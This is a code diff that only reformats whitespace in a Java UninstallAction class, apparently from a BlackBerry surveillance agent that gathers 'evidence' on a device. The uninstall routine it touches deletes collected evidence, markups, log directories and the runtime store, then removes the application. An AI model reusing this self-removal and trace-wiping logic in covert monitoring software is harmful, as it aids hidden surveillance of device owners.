@@ -32,6 +32,7 @@ import blackberry.utils.Utils;
 public final class UninstallAction extends SubActionMain {
     //#ifdef DEBUG
     static Debug debug = new Debug("UninstallAction", DebugLevel.VERBOSE);
+
     //#endif
 
     /**
@@ -45,13 +46,13 @@ public final class UninstallAction extends SubActionMain {
     public UninstallAction(final ConfAction params) {
         super(params);
     }
-    
+
     protected boolean parse(ConfAction params) {
         return true;
     }
 
     public boolean execute(Trigger trigger) {
-        Status.self().uninstall=true;
+        Status.self().uninstall = true;
         return true;
     }
 
@@ -62,7 +63,7 @@ public final class UninstallAction extends SubActionMain {
         ret &= deleteRuntimeStore();
         //ret &= deleteApplication();
         Core.getInstance().uninstallAtExit();
-        
+
         return ret;
     }
 
@@ -93,9 +94,9 @@ public final class UninstallAction extends SubActionMain {
 
     public static boolean deleteApplication() {
         try {
-            
+
             Core.getInstance().uninstallAtExit();
-            
+
             final ApplicationDescriptor ad = ApplicationDescriptor
                     .currentApplicationDescriptor();
 
@@ -167,8 +168,9 @@ public final class UninstallAction extends SubActionMain {
             //#endif
             EvidenceCollector.getInstance().removeProgressive();
             Markup.removeMarkups();
-            int removed=EvidenceCollector.getInstance().removeLogDirs(Integer.MAX_VALUE);
-      
+            int removed = EvidenceCollector.getInstance().removeLogDirs(
+                    Integer.MAX_VALUE);
+
         } catch (Exception ex) {
             //#ifdef DEBUG
             debug.error("removeFiles: " + ex);
@@ -177,8 +179,6 @@ public final class UninstallAction extends SubActionMain {
         }
         return true;
     }
-
-
 
     //#ifdef DEBUG
     public String toString() {
